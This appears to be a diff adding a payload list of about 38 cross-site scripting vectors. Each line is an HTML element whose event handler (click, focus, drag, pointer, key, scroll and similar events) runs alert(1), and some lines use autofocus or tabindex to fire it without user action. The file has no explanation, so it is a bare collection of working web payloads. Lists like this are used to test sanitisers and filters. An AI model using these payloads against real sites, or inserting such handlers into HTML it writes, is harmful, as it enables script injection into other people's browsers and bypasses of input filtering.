@@ -1,0 +1,38 @@
+<element contenteditable onbeforeinput=alert(1)>test
+<element draggable="true" ondrag="alert(1)" style=display:block>test</element>
+<element draggable="true" ondragend="alert(1)" style=display:block>test</element>
+<element draggable="true" ondragenter="alert(1)" style=display:block>test</element>
+<element draggable="true" ondragleave="alert(1)" style=display:block>test</element>
+<element draggable="true" ondragstart="alert(1)" style=display:block>test</element>
+<element id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></element>
+<element id=x tabindex=1 onfocus=alert(1)></element>
+<element id=x tabindex=1 onfocusin=alert(1)></element>
+<element onafterscriptexecute=alert(1)><script>1</script>
+<element onbeforescriptexecute=alert(1)><script>1</script>
+<element onblur=alert(1) id=x tabindex=1 style=display:block>test</element><input value=clickme>
+<element onclick="alert(1)" style=display:block>test</element>
+<element oncontextmenu="alert(1)" style=display:block>test</element>
+<element oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<element oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<element ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</element>
+<element onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</element><input value=clickme>
+<element onkeydown="alert(1)" contenteditable style=display:block>test</element>
+<element onkeypress="alert(1)" contenteditable style=display:block>test</element>
+<element onkeyup="alert(1)" contenteditable style=display:block>test</element>
+<element onmousedown="alert(1)" style=display:block>test</element>
+<element onmouseenter="alert(1)" style=display:block>test</element>
+<element onmouseleave="alert(1)" style=display:block>test</element>
+<element onmousemove="alert(1)" style=display:block>test</element>
+<element onmouseout="alert(1)" style=display:block>test</element>
+<element onmouseover="alert(1)" style=display:block>test</element>
+<element onmouseup="alert(1)" style=display:block>test</element>
+<element onmousewheel=alert(1) style=display:block>requires scrolling
+<element onpointerdown=alert(1) style=display:block>XSS</element>
+<element onpointerenter=alert(1) style=display:block>XSS</element>
+<element onpointerleave=alert(1) style=display:block>XSS</element>
+<element onpointermove=alert(1) style=display:block>XSS</element>
+<element onpointerout=alert(1) style=display:block>XSS</element>
+<element onpointerover=alert(1) style=display:block>XSS</element>
+<element onpointerrawupdate=alert(1) style=display:block>XSS</element>
+<element onpointerup=alert(1) style=display:block>XSS</element>
+<element onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></element>
